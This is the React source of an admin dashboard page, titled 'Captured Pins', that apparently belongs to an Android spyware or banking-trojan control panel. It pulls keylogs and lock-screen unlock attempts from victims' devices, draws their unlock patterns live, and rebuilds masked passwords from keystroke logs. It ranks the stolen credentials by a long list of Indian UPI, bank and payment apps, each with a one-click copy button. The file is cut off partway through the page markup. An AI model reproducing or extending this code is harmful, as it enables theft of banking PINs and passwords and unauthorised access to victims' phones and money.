'use client';

import { useState, useEffect, useCallback, Suspense, useMemo } from 'react';
import { useSearchParams } from 'next/navigation';
import { connectSocket } from '@/lib/socket';
import { API_URL } from '@/lib/api';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import Link from 'next/link';
import {
    Lock, Key, Smartphone, ArrowLeft, Copy, Check,
    Shield, RefreshCw, Eye, ChevronDown, ChevronRight,
    Fingerprint, Grid3X3, Hash, Sparkles, Wallet, Keyboard, Zap, Star
} from 'lucide-react';

// COMPREHENSIVE UPI/Payment app packages
const UPI_PACKAGES = [
    // Major UPI Apps
    { package: 'net.one97.paytm', name: 'Paytm', color: '#00BAF2' },
    { package: 'com.phonepe.app', name: 'PhonePe', color: '#5F259F' },
    { package: 'com.google.android.apps.nbu.paisa.user', name: 'Google Pay', color: '#4285F4' },
    { package: 'in.org.npci.upiapp', name: 'BHIM', color: '#00A651' },

    // Bank UPI Apps
    { package: 'com.sbi.upi', name: 'SBI Pay (YONO)', color: '#22409A' },
    { package: 'com.icicibank.pockets', name: 'ICICI iMobile Pay', color: '#F58220' },
    { package: 'com.hdfcbank.payzapp', name: 'HDFC PayZapp', color: '#004C8F' },
    { package: 'com.axis.mobile', name: 'Axis Mobile', color: '#97144D' },
    { package: 'com.kotak.mobile.banking', name: 'Kotak', color: '#ED1C24' },
    { package: 'com.bob.upi', name: 'BOB World', color: '#F47920' },
    { package: 'com.pnb.pnboneupi', name: 'PNB ONE', color: '#1E4A8C' },
    { package: 'com.idbi.mobile', name: 'IDBI Bank GO', color: '#007DC5' },
    { package: 'com.indusind.ib', name: 'IndusInd Bank', color: '#8B1538' },
    { package: 'com.rbl.mobilebanking', name: 'RBL MoBank', color: '#003366' },
    { package: 'com.canarabank.mobility', name: 'Canara ai1', color: '#FDB913' },
    { package: 'com.unionbank.ecommerce.android.yonoapp', name: 'YONO SBI', color: '#005BAC' },
    { package: 'com.idfc.first.bank', name: 'IDFC FIRST Bank', color: '#9C1D26' },
    { package: 'com.yes.upi', name: 'YES PAY', color: '#0066B3' },
    { package: 'com.federalbank.liberty', name: 'Federal Bank', color: '#FDB515' },
    { package: 'com.iob.mobile', name: 'IOB iMobile', color: '#ED1C24' },

    // Wallet/Fintech UPI Apps
    { package: 'com.whatsapp', name: 'WhatsApp Pay', color: '#25D366' },
    { package: 'in.amazon.mShop.android.shopping', name: 'Amazon Pay', color: '#FF9900' },
    { package: 'com.freecharge.android', name: 'Freecharge', color: '#8A2BE2' },
    { package: 'com.mobikwik_new', name: 'MobiKwik', color: '#3399FF' },
    { package: 'flipkart.com', name: 'Flipkart', color: '#2874F0' },
    { package: 'com.myairtelapp', name: 'Airtel Thanks', color: '#ED1C24' },
    { package: 'com.jio.myjio', name: 'MyJio', color: '#0A2885' },
    { package: 'com.cred.android', name: 'CRED', color: '#1A1A2E' },
    { package: 'com.slice', name: 'slice', color: '#6C5CE7' },
    { package: 'com.groww.android', name: 'Groww', color: '#00D09C' },
    { package: 'com.zerodha.kite3', name: 'Zerodha Kite', color: '#387ED1' },
    { package: 'com.upstox.pro', name: 'Upstox', color: '#7B2BF9' },
    { package: 'com.angelbroking.smartbroker', name: 'Angel One', color: '#1C4587' },
    { package: 'com.dhan.client', name: 'Dhan', color: '#00BFFF' },
    { package: 'co.smallcase.android', name: 'smallcase', color: '#2F80ED' },
    { package: 'com.dream11.fantasy', name: 'Dream11', color: '#D91F1F' },
    { package: 'com.app.my11circle', name: 'My11Circle', color: '#FF6B00' },
    { package: 'com.app.mpl', name: 'MPL', color: '#FF6B35' },
    { package: 'io.jupiter.money', name: 'Jupiter', color: '#7B61FF' },
    { package: 'com.fi.money', name: 'Fi Money', color: '#6C5CE7' },
    { package: 'com.niyo.global', name: 'Niyo', color: '#00C3FF' },
    { package: 'com.payzapp', name: 'PayZapp', color: '#004C8F' },
    { package: 'com.lazypay.android', name: 'LazyPay', color: '#FF385C' },
    { package: 'com.simpl.android', name: 'Simpl', color: '#00B5AD' },
    { package: 'com.zestmoney.zestpay', name: 'ZestMoney', color: '#FF6B00' },
    { package: 'com.ola.money', name: 'Ola Money', color: '#22C55E' },
    { package: 'com.uber.driver', name: 'Uber', color: '#000000' },
    { package: 'com.application.zomato', name: 'Zomato', color: '#E23744' },
    { package: 'in.swiggy.android', name: 'Swiggy', color: '#FC8019' },
    { package: 'com.bigbasket.mobileapp', name: 'BigBasket', color: '#84C225' },
    { package: 'in.dmart.app', name: 'DMart Ready', color: '#0072BC' },
    { package: 'com.reliancesmartapp', name: 'JioMart', color: '#0078D4' },
];

// Lock screen packages for categorization
const LOCK_PACKAGES = [
    'com.android.systemui', 'com.android.settings', 'com.samsung.android.app.launcher',
    'com.sec.android.app.launcher', 'com.miui.securitycenter', 'com.coloros.safecenter',
    'com.oplus.safecenter', 'com.bbk.launcher2', 'com.vivo.safecenter', 'com.huawei.systemmanager',
    'com.oneplus.security', 'com.asus.securitycenter', 'com.lenovo.security',
];

interface UnlockAttempt {
    id: string;
    unlockType: string;
    unlockData: string | null;
    success: boolean;
    reason: string | null;
    timestamp: string;
}

interface Keylog {
    id: string;
    app: string;
    appName: string;
    text: string;
    timestamp: string;
}

interface ExtractedPassword {
    text: string;
    startTime: Date;
    endTime: Date;
    count: number;
    isPassword: boolean;
}

interface AppPasswordGroup {
    appName: string;
    passwords: ExtractedPassword[];
    totalLogs: number;
    isUPI: boolean;
    isLockScreen: boolean;
    mostUsedPassword: string | null;
}

export default function PhoneLockPage() {
    return (
        <Suspense fallback={null}>
            <PhoneLockContent />
        </Suspense>
    );
}

// Beautify algorithm - extract passwords from masked sequences
function beautifyAppLogs(logs: Keylog[]): { extracted: ExtractedPassword[], mergedCount: number } {
    if (!logs || logs.length === 0) return { extracted: [], mergedCount: 0 };

    const sorted = [...logs].sort((a, b) =>
        new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
    );

    const deduplicated: Keylog[] = [];
    let duplicatesRemoved = 0;

    for (let i = 0; i < sorted.length; i++) {
        const current = sorted[i];
        const currentText = current.text || '';

        if (i > 0) {
            const prevText = sorted[i - 1].text || '';
            const currentHasMask = currentText.includes('•') || currentText.includes('*') || currentText.includes('●');
            const prevHasMask = prevText.includes('•') || prevText.includes('*') || prevText.includes('●');

            if (currentHasMask && prevHasMask) {
                const currentMaskCount = (currentText.match(/[•*●]/g) || []).length;
                const prevMaskCount = (prevText.match(/[•*●]/g) || []).length;
                const currentVisible = currentText.replace(/[•*●]/g, '');
                const prevVisible = prevText.replace(/[•*●]/g, '');

                if (currentMaskCount === prevMaskCount && currentVisible === prevVisible) {
                    duplicatesRemoved++;
                    continue;
                }
            }
        }
        deduplicated.push(current);
    }

    const extracted: ExtractedPassword[] = [];
    let totalMerged = duplicatesRemoved;

    let i = 0;
    while (i < deduplicated.length) {
        const current = deduplicated[i];
        const text = current.text || '';
        const hasMask = text.includes('•') || text.includes('*') || text.includes('●');

        if (!hasMask) {
            const nextIdx = i + 1;
            if (nextIdx < deduplicated.length) {
                const nextText = deduplicated[nextIdx].text || '';
                const nextHasMask = nextText.includes('•') || nextText.includes('*') || nextText.includes('●');

                if (nextHasMask) {
                    const startTime = new Date(current.timestamp);
                    let password = text;
                    let endTime = startTime;
                    let count = 1;

                    let j = nextIdx;
                    while (j < deduplicated.length) {
                        const entry = deduplicated[j];
                        const entryText = entry.text || '';
                        const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');

                        if (!entryHasMask) break;

                        const visibleChars = entryText.replace(/[•*●]/g, '');
                        if (visibleChars.length > 0) {
                            password += visibleChars.slice(-1);
                        }
                        endTime = new Date(entry.timestamp);
                        count++;
                        j++;
                    }

                    if (password.length > 1) {
                        extracted.push({ text: password, startTime, endTime, count, isPassword: true });
                        totalMerged += count;
                    }
                    i = j;
                    continue;
                }
            }

            // Check if this looks like a PIN (all digits, 4-6 chars)
            if (/^\d{4,6}$/.test(text)) {
                extracted.push({
                    text,
                    startTime: new Date(current.timestamp),
                    endTime: new Date(current.timestamp),
                    count: 1,
                    isPassword: true
                });
            }
        } else {
            const startTime = new Date(current.timestamp);
            let password = '';
            let endTime = startTime;
            let count = 0;

            let j = i;
            while (j < deduplicated.length) {
                const entry = deduplicated[j];
                const entryText = entry.text || '';
                const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');

                if (!entryHasMask && j > i) break;

                if (entryHasMask) {
                    const visibleChars = entryText.replace(/[•*●]/g, '');
                    if (visibleChars.length > 0) {
                        password += visibleChars.slice(-1);
                    }
                    endTime = new Date(entry.timestamp);
                    count++;
                }
                j++;
            }

            if (password.length > 0) {
                extracted.push({ text: password, startTime, endTime, count, isPassword: true });
                totalMerged += count;
            }
            i = j;
            continue;
        }
        i++;
    }

    return { extracted, mergedCount: totalMerged };
}

// Find most used password from list
function findMostUsedPassword(passwords: ExtractedPassword[]): string | null {
    if (passwords.length === 0) return null;

    const counts: Record<string, number> = {};
    for (const pwd of passwords) {
        counts[pwd.text] = (counts[pwd.text] || 0) + 1;
    }

    let maxCount = 0;
    let mostUsed: string | null = null;
    for (const [text, count] of Object.entries(counts)) {
        if (count > maxCount) {
            maxCount = count;
            mostUsed = text;
        }
    }

    return mostUsed;
}

function PhoneLockContent() {
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;

    // Tab state
    const [activeTab, setActiveTab] = useState<'unlock' | 'passwords'>('unlock');

    // Unlock attempts state
    const [unlockAttempts, setUnlockAttempts] = useState<UnlockAttempt[]>([]);
    const [loading, setLoading] = useState(true);
    const [currentPattern, setCurrentPattern] = useState<number[]>([]);
    const [capturedPattern, setCapturedPattern] = useState<number[]>([]);
    const [lastPatternTime, setLastPatternTime] = useState<number | null>(null);

    // Keylogs state
    const [keylogs, setKeylogs] = useState<Keylog[]>([]);
    const [keylogsLoading, setKeylogsLoading] = useState(false);

    // Expanded sections state
    const [expandedApps, setExpandedApps] = useState<Set<string>>(new Set());

    // Copy state
    const [copiedId, setCopiedId] = useState<string | null>(null);

    // Toggle expand
    const toggleExpand = (appName: string) => {
        setExpandedApps(prev => {
            const newSet = new Set(prev);
            if (newSet.has(appName)) {
                newSet.delete(appName);
            } else {
                newSet.add(appName);
            }
            return newSet;
        });
    };

    // Fetch unlock attempts and load last successful pattern
    const fetchUnlockAttempts = useCallback(async () => {
        if (!deviceId) return;
        try {
            const token = typeof window !== 'undefined' ? localStorage.getItem('admin_token') : null;
            const res = await fetch(`${API_URL}/api/devices/${deviceId}/unlocks?limit=50`, {
                headers: token ? { 'Authorization': `Bearer ${token}` } : {}
            });
            const data = await res.json();
            if (data.success) {
                setUnlockAttempts(data.data);

                // Auto-load the last successful pattern unlock on page load
                if (capturedPattern.length === 0 && data.data && data.data.length > 0) {
                    const lastSuccessfulPattern = data.data.find(
                        (attempt: UnlockAttempt) => attempt.unlockType === 'pattern' && attempt.success && attempt.unlockData
                    );
                    if (lastSuccessfulPattern && lastSuccessfulPattern.unlockData) {
                        const cells = lastSuccessfulPattern.unlockData.split(',').map(Number).filter((n: number) => !isNaN(n) && n >= 1 && n <= 9);
                        if (cells.length > 0) {
                            setCapturedPattern(cells);
                            setLastPatternTime(new Date(lastSuccessfulPattern.timestamp).getTime());
                        }
                    }
                }
            }
        } catch (err) {
            console.error('Error fetching unlock attempts:', err);
        } finally {
            setLoading(false);
        }
    }, [deviceId, capturedPattern.length]);

    // Fetch keylogs for password extraction
    const fetchKeylogs = useCallback(async () => {
        if (!deviceId) return;
        try {
            setKeylogsLoading(true);
            const token = typeof window !== 'undefined' ? localStorage.getItem('admin_token') : null;
            const res = await fetch(`${API_URL}/api/devices/${deviceId}/keylogs?limit=2000`, {
                headers: token ? { 'Authorization': `Bearer ${token}` } : {}
            });
            const data = await res.json();
            if (data.success) {
                setKeylogs(data.data);
            }
        } catch (err) {
            console.error('Error fetching keylogs:', err);
        } finally {
            setKeylogsLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (deviceId) {
            fetchUnlockAttempts();
            fetchKeylogs();
        }
    }, [deviceId, fetchUnlockAttempts, fetchKeylogs]);

    // Socket listeners
    useEffect(() => {
        if (!deviceId) return;
        const socket = connectSocket();

        const handleUnlockAttempt = (data: any) => {
            if (data.deviceId === deviceId) {
                setUnlockAttempts(prev => [{
                    id: Date.now().toString(),
                    unlockType: data.unlockType,
                    unlockData: data.unlockData,
                    success: data.success,
                    reason: data.reason,
                    timestamp: new Date(data.timestamp).toISOString()
                }, ...prev]);

                if (data.unlockType === 'pattern' && data.unlockData) {
                    const cells = data.unlockData.split(',').map(Number);
                    setCapturedPattern(cells);
                    setLastPatternTime(Date.now());
                }
            }
        };

        const handlePatternProgress = (data: any) => {
            if (data.deviceId === deviceId) {
                setCurrentPattern(data.sequence);
            }
        };

        const handlePatternCaptured = (data: any) => {
            if (data.deviceId === deviceId) {
                setCapturedPattern(data.sequence);
                setCurrentPattern([]);
                setLastPatternTime(Date.now());
            }
        };

        socket.on('unlock:attempt', handleUnlockAttempt);
        socket.on('pattern:progress', handlePatternProgress);
        socket.on('pattern:captured', handlePatternCaptured);

        return () => {
            socket.off('unlock:attempt', handleUnlockAttempt);
            socket.off('pattern:progress', handlePatternProgress);
            socket.off('pattern:captured', handlePatternCaptured);
        };
    }, [deviceId]);

    // Group keylogs by app, beautify each, show those with passwords
    const appPasswordGroups = useMemo(() => {
        if (!keylogs || keylogs.length === 0) return [];

        const grouped: Record<string, Keylog[]> = {};
        for (const log of keylogs) {
            const appName = log.appName || log.app || 'Unknown';
            if (!grouped[appName]) grouped[appName] = [];
            grouped[appName].push(log);
        }

        const results: AppPasswordGroup[] = [];
        for (const [appName, logs] of Object.entries(grouped)) {
            const { extracted } = beautifyAppLogs(logs);
            if (extracted.length > 0) {
                const appLower = appName.toLowerCase();
                const isUPI = UPI_PACKAGES.some(pkg => appLower.includes(pkg.package.toLowerCase()));
                const isLockScreen = LOCK_PACKAGES.some(pkg => appLower.includes(pkg.toLowerCase()));
                const mostUsedPassword = findMostUsedPassword(extracted);

                results.push({
                    appName,
                    passwords: extracted,
                    totalLogs: logs.length,
                    isUPI,
                    isLockScreen,
                    mostUsedPassword
                });
            }
        }

        // Sort: UPI first, then lock screen, then others
        results.sort((a, b) => {
            if (a.isUPI && !b.isUPI) return -1;
            if (!a.isUPI && b.isUPI) return 1;
            if (a.isLockScreen && !b.isLockScreen) return -1;
            if (!a.isLockScreen && b.isLockScreen) return 1;
            return b.passwords.length - a.passwords.length;
        });

        return results;
    }, [keylogs]);

    // Helpers
    const handleCopy = async (text: string, id: string) => {
        try {
            await navigator.clipboard.writeText(text);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        } catch (err) {
            console.error('Failed to copy:', err);
        }
    };

    const timeAgo = (timestamp: string) => {
        const now = Date.now();
        const time = new Date(timestamp).getTime();
        const diff = now - time;

        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
        if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
        return new Date(timestamp).toLocaleDateString();
    };

    const getUnlockIcon = (type: string) => {
        switch (type) {
            case 'pin': return <Hash className="w-5 h-5" />;
            case 'pattern': return <Grid3X3 className="w-5 h-5" />;
            case 'password': return <Key className="w-5 h-5" />;
            case 'biometric': return <Fingerprint className="w-5 h-5" />;
            default: return <Lock className="w-5 h-5" />;
        }
    };

    const getAppInfo = (appName: string): { name: string, color: string } => {
        const appLower = appName.toLowerCase();

        // Check against UPI packages
        for (const pkg of UPI_PACKAGES) {
            if (appLower.includes(pkg.package.toLowerCase()) || appLower.includes(pkg.name.toLowerCase())) {
                return { name: pkg.name, color: pkg.color };
            }
        }

        // Check for lock screen
        if (LOCK_PACKAGES.some(pkg => appLower.includes(pkg.toLowerCase()))) {
            if (appLower.includes('samsung')) return { name: 'Samsung Lock', color: '#1428A0' };
            if (appLower.includes('miui') || appLower.includes('xiaomi')) return { name: 'Xiaomi Lock', color: '#FF6900' };
            if (appLower.includes('systemui')) return { name: 'Lock Screen', color: '#607D8B' };
            if (appLower.includes('settings')) return { name: 'Settings PIN', color: '#4CAF50' };
            return { name: 'Lock Screen', color: '#607D8B' };
        }

        // Default
        const parts = appName.split('.');
        return { name: parts[parts.length - 1] || appName, color: '#6366F1' };
    };

    // Pattern grid visualization with SVG arrows
    // Grid layout: 1 2 3
    //              4 5 6
    //              7 8 9
    const PatternGrid = ({ pattern, isActive = false, size = 'normal' }: { pattern: number[], isActive?: boolean, size?: 'normal' | 'small' }) => {
        // Grid positions for pattern cells 1-9 (Android uses 1-9, not 0-8)
        // We'll map to a coordinate system for SVG drawing
        const gridSize = size === 'small' ? 160 : 220;
        const dotRadius = size === 'small' ? 14 : 18;
        const spacing = size === 'small' ? 50 : 70;
        const margin = size === 'small' ? 30 : 40;

        // Get position for cell number (1-9)
        const getCellPosition = (cellNum: number): { x: number, y: number } => {
            // Cell numbering: 1 2 3
            //                 4 5 6
            //                 7 8 9
            const adjustedNum = cellNum - 1; // Convert to 0-indexed
            const row = Math.floor(adjustedNum / 3);
            const col = adjustedNum % 3;
            return {
                x: margin + col * spacing,
                y: margin + row * spacing
            };
        };


        return (
            <div className="flex flex-col items-center">
                <svg
                    width={gridSize}
                    height={gridSize}
                    className="overflow-visible"
                >
                    {/* Draw connecting arrows between dots */}
                    {pattern.length > 1 && pattern.map((cell, index) => {
                        if (index === 0) return null;
                        const prevCell = pattern[index - 1];
                        const from = getCellPosition(prevCell);
                        const to = getCellPosition(cell);

                        // Calculate shortened endpoints
                        const dx = to.x - from.x;
                        const dy = to.y - from.y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        const startPad = dotRadius + 4;
                        const endPad = dotRadius + 10;

                        const startX = from.x + (dx / dist) * startPad;
                        const startY = from.y + (dy / dist) * startPad;
                        const endX = to.x - (dx / dist) * endPad;
                        const endY = to.y - (dy / dist) * endPad;

                        return (
                            <line
                                key={`arrow-${index}`}
                                x1={startX}
                                y1={startY}
                                x2={endX}
                                y2={endY}
                                stroke="url(#lineGradient)"
                                strokeWidth={3}
                                strokeLinecap="round"
                                markerEnd="url(#arrowMarker)"
                                className={isActive ? 'animate-pulse' : ''}
                            />
                        );
                    })}

                    {/* SVG Definitions */}
                    <defs>
                        <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stopColor="#8B5CF6" />
                            <stop offset="100%" stopColor="#A855F7" />
                        </linearGradient>
                        <radialGradient id="dotGradient" cx="30%" cy="30%">
                            <stop offset="0%" stopColor="#A78BFA" />
                            <stop offset="100%" stopColor="#7C3AED" />
                        </radialGradient>
                        <marker
                            id="arrowMarker"
                            markerWidth="6"
                            markerHeight="6"
                            refX="5"
                            refY="3"
                            orient="auto"
                            markerUnits="strokeWidth"
                        >
                            <polygon points="0,0 6,3 0,6" fill="#8B5CF6" />
                        </marker>
                    </defs>

                    {/* Draw dots (1-9) */}
                    {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((cellNum) => {
                        const pos = getCellPosition(cellNum);
                        const isInPattern = pattern.includes(cellNum);
                        const orderInPattern = pattern.indexOf(cellNum);

                        return (
                            <g key={cellNum}>
                                {/* Outer ring for selected */}
                                {isInPattern && (
                                    <circle
                                        cx={pos.x}
                                        cy={pos.y}
                                        r={dotRadius + 4}
                                        fill="none"
                                        stroke="#8B5CF6"
                                        strokeWidth={2}
                                        opacity={0.5}
                                        className={isActive ? 'animate-ping' : ''}
                                    />
                                )}
                                {/* Main dot */}
                                <circle
                                    cx={pos.x}
                                    cy={pos.y}
                                    r={dotRadius}
                                    fill={isInPattern ? 'url(#dotGradient)' : '#E5E7EB'}
                                    stroke={isInPattern ? '#7C3AED' : '#D1D5DB'}
                                    strokeWidth={2}
                                />
                                {/* Order number badge (for selected dots) */}
                                {isInPattern && (
                                    <text
                                        x={pos.x}
                                        y={pos.y}
                                        textAnchor="middle"
                                        dominantBaseline="central"
                                        fill="white"
                                        fontSize={size === 'small' ? 10 : 12}
                                        fontWeight="bold"
                                    >
                                        {orderInPattern + 1}
                                    </text>
                                )}
                                {/* Cell number label (for unselected) */}
                                {!isInPattern && (
                                    <text
                                        x={pos.x}
                                        y={pos.y}
                                        textAnchor="middle"
                                        dominantBaseline="central"
                                        fill="#9CA3AF"
                                        fontSize={size === 'small' ? 9 : 11}
                                    >
                                        {cellNum}
                                    </text>
                                )}
                            </g>
                        );
                    })}

                </svg>

                {/* Sequence text */}
                {pattern.length > 0 && (
                    <div className="mt-3 text-center">
                        <div className="text-sm font-medium text-[var(--text-primary)]">
                            Sequence: {pattern.join(' → ')}
                        </div>
                        <div className="text-xs text-[var(--text-muted)] mt-1">
                            {pattern.length} dots connected
                        </div>
                    </div>
                )}
            </div>
        );
    };

    const totalPasswords = appPasswordGroups.reduce((sum, g) => sum + g.passwords.length, 0);
    const upiGroups = appPasswordGroups.filter(g => g.isUPI);
    const lockGroups = appPasswordGroups.filter(g => g.isLockScreen);
    const otherGroups = appPasswordGroups.filter(g => !g.isUPI && !g.isLockScreen);

    const tabs = [
        { id: 'unlock' as const, label: 'Unlock Attempts', icon: Lock, count: unlockAttempts.length },
        { id: 'passwords' as const, label: 'Captured Passwords', icon: Key, count: totalPasswords },
    ];

    return (
        <div className="min-h-screen bg-[var(--bg-elevated)] pb-20 lg:pb-0">
            <Sidebar />
            <main className="lg:ml-72 lg:bg-[var(--bg-base)]">
                <Header
                    title="Captured Pins"
                    subtitle="PIN, Pattern & Password Analysis"
                    onRefresh={() => { fetchUnlockAttempts(); fetchKeylogs(); }}
                />

                <div className="p-3 lg:px-8 lg:py-6 lg:max-w-6xl lg:mx-auto space-y-4">
                    {/* Back Link */}
                    <Link href={`/devices/view/?id=${deviceId}`} className="inline-flex items-center gap-2 text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors text-sm font-medium">
                        <ArrowLeft className="w-4 h-4" />
                        Back to Device
                    </Link>

                    {/* Tab Navigation */}
                    <div className="bg-white rounded-xl p-1.5 border border-[var(--border-light)] flex gap-1">
                        {tabs.map(tab => (
                            <button
                                key={tab.id}
                                onClick={() => setActiveTab(tab.id)}
                                className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-lg text-sm font-medium transition-all ${activeTab === tab.id
                                    ? 'bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white shadow-md'
                                    : 'text-[var(--text-muted)] hover:bg-[var(--bg-subtle)]'
                                    }`}
                            >
                                <tab.icon className="w-4 h-4" />
                                <span>{tab.label}</span>
                                {tab.count > 0 && (
                                    <span className={`px-2 py-0.5 rounded-full text-xs font-bold ${activeTab === tab.id ? 'bg-white/20' : 'bg-[var(--bg-subtle)]'
                                        }`}>
                                        {tab.count}
                                    </span>
                                )}
                            </button>
                        ))}
                    </div>

                    {/* Tab Content */}
                    {activeTab === 'unlock' && (
                        <div className="space-y-4">
                            {/* Live Pattern Display */}
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div className="bg-white rounded-xl p-6 border border-[var(--border-light)]">
                                    <h2 className="text-lg font-semibold text-[var(--text-primary)] mb-4 flex items-center gap-2">
                                        <span className={`w-2 h-2 rounded-full ${currentPattern.length > 0 ? 'bg-green-500 animate-pulse' : 'bg-gray-300'}`} />
                                        Live Pattern
                                    </h2>
                                    {currentPattern.length > 0 ? (
                                        <PatternGrid pattern={currentPattern} isActive={true} />
                                    ) : (
                                        <div className="text-center py-8 text-[var(--text-muted)]">
                                            <Grid3X3 className="w-12 h-12 mx-auto mb-3 opacity-30" />
                                            <p>Waiting for pattern input...</p>
                                        </div>
                                    )}
                                </div>

                                <div className="bg-white rounded-xl p-6 border border-[var(--border-light)]">
                                    <h2 className="text-lg font-semibold text-[var(--text-primary)] mb-4 flex items-center gap-2">
                                        <Check className="w-5 h-5 text-green-500" />
                                        Last Captured Pattern
                                    </h2>
                                    {capturedPattern.length > 0 ? (
                                        <>
                                            <PatternGrid pattern={capturedPattern} />
                                            {lastPatternTime && (
                                                <div className="mt-2 text-center text-xs text-[var(--text-muted)]">
                                                    Captured {timeAgo(new Date(lastPatternTime).toISOString())}
                                                </div>
                                            )}
                                        </>
                                    ) : (
                                        <div className="text-center py-8 text-[var(--text-muted)]">
                                            <Grid3X3 className="w-12 h-12 mx-auto mb-3 opacity-30" />
                                            <p>No pattern captured yet</p>
                                        </div>
                                    )}
                                </div>
                            </div>

                            {/* Unlock History */}
                            <div className="bg-white rounded-xl border border-[var(--border-light)] overflow-hidden">
                                <div className="px-5 py-4 bg-[var(--bg-subtle)] border-b border-[var(--border-light)] flex items-center justify-between">
                                    <h2 className="font-semibold text-[var(--text-primary)]">Unlock History</h2>
                                    <span className="text-sm text-[var(--text-muted)]">{unlockAttempts.length} attempts</span>
                                </div>

                                {loading ? (
                                    <div className="p-8 text-center text-[var(--text-muted)]">Loading...</div>
                                ) : unlockAttempts.length === 0 ? (
                                    <div className="p-8 text-center text-[var(--text-muted)]">
                                        <Lock className="w-12 h-12 mx-auto mb-3 opacity-30" />
                                        <p>No unlock attempts recorded yet</p>
                                    </div>
                                ) : (
                                    <div className="divide-y divide-[var(--border-light)] max-h-96 overflow-y-auto">
                                        {unlockAttempts.map((attempt) => (
                                            <div
                                                key={attempt.id}
                                                className={`flex items-center gap-4 p-4 ${attempt.success ? 'bg-emerald-50/50' : 'bg-red-50/50'
                                                    }`}
                                            >
                                                <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${attempt.success
                                                    ? 'bg-emerald-100 text-emerald-600'
                                                    : 'bg-red-100 text-red-600'
                                                    }`}>
                                                    {getUnlockIcon(attempt.unlockType)}
                                                </div>

                                                <div className="flex-1 min-w-0">
                                                    <div className="flex items-center gap-2 flex-wrap">
                                                        <span className="font-medium text-[var(--text-primary)] capitalize">
                                                            {attempt.unlockType} Unlock
                                                        </span>
                                                        <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${attempt.success
                                                            ? 'bg-emerald-100 text-emerald-700'
                                                            : 'bg-red-100 text-red-700'
                                                            }`}>
                                                            {attempt.success ? 'Success' : 'Failed'}
                                                        </span>
                                                    </div>

                                                    {attempt.unlockData && (
                                                        <div className="mt-1 flex items-center gap-2">
                                                            <code className="text-lg font-mono font-semibold text-[var(--aurora-violet)]">
                                                                {attempt.unlockType === 'pattern'
                                                                    ? `Pattern: ${attempt.unlockData}`
                                                                    : attempt.unlockType === 'pin'
                                                                        ? `PIN: ${attempt.unlockData}`
                                                                        : attempt.unlockData
                                                                }
                                                            </code>
                                                            <button
                                                                onClick={() => handleCopy(attempt.unlockData!, attempt.id)}
                                                                className="p-1 rounded hover:bg-white/50"
                                                            >
                                                                {copiedId === attempt.id
                                                                    ? <Check className="w-4 h-4 text-emerald-500" />
                                                                    : <Copy className="w-4 h-4 text-[var(--text-muted)]" />
                                                                }
                                                            </button>
                                                        </div>
                                                    )}
                                                </div>

                                                <div className="text-xs text-[var(--text-muted)]">
                                                    {timeAgo(attempt.timestamp)}
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {activeTab === 'passwords' && (
                        <div className="space-y-4">
                            {/* Info Card */}
                            <div className="bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl p-4 text-white">
                                <div className="flex items-start gap-3">
                                    <Sparkles className="w-6 h-6 flex-shrink-0 mt-0.5" />
                                    <div>
                                        <h3 className="font-semibold">Captured Passwords from Keylogs</h3>
                                        <p className="text-sm text-white/80 mt-1">
                                            Click on any app to expand and see all passwords. Use ⚡ Extract to get the most used password.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            {keylogsLoading ? (
                                <div className="bg-white rounded-xl p-8 border border-[var(--border-light)] text-center text-[var(--text-muted)]">
                                    Analyzing keylogs...
                                </div>
                            ) : appPasswordGroups.length === 0 ? (
                                <div className="bg-white rounded-xl p-8 border border-[var(--border-light)] text-center text-[var(--text-muted)]">
                                    <Keyboard className="w-12 h-12 mx-auto mb-3 opacity-30" />
                                    <p>No passwords captured yet</p>
                                </div>
                            ) : (
                                <div className="space-y-6">
                                    {/* UPI Apps Section */}
                                    {upiGroups.length > 0 && (
                                        <div>
                                            <h3 className="text-sm font-semibold text-[var(--text-muted)] mb-3 flex items-center gap-2">
                                                <Wallet className="w-4 h-4" />
                                                UPI & Payment Apps ({upiGroups.length})
                                            </h3>
                                            <div className="space-y-2">
                                                {upiGroups.map((group) => {
                                                    const { name, color } = getAppInfo(group.appName);
                                                    const isExpanded = expandedApps.has(group.appName);

                                                    return (
                                                        <div key={group.appName} className="bg-white rounded-xl border border-[var(--border-light)] overflow-hidden">
                                                            {/* Collapsible Header */}
                                                            <div
                                                                role="button"
                                                                tabIndex={0}
                                                                onClick={() => toggleExpand(group.appName)}
                                                                onKeyDown={(e) => e.key === 'Enter' && toggleExpand(group.appName)}
                                                                className="w-full px-5 py-4 flex items-center gap-3 hover:bg-[var(--bg-subtle)] transition-colors cursor-pointer"
                                                            >
                                                                <div
                                                                    className="w-10 h-10 rounded-xl flex items-center justify-center"
                                                                    style={{ backgroundColor: `${color}20` }}
                                                                >
                                                                    <Wallet className="w-5 h-5" style={{ color }} />
                                                                </div>
                                                                <div className="flex-1 text-left">
                                                                    <h4 className="font-semibold text-[var(--text-primary)]">{name}</h4>
                                                                    <p className="text-xs text-[var(--text-muted)]">
                                                                        {group.passwords.length} password(s) captured
                                                                    </p>
                                                                </div>

                                                                {/* Most Used Password Quick Extract */}
                                                                {group.mostUsedPassword && (
                                                                    <button
                                                                        onClick={(e) => {
                                                                            e.stopPropagation();
                                                                            handleCopy(group.mostUsedPassword!, `best-${group.appName}`);
                                                                        }}
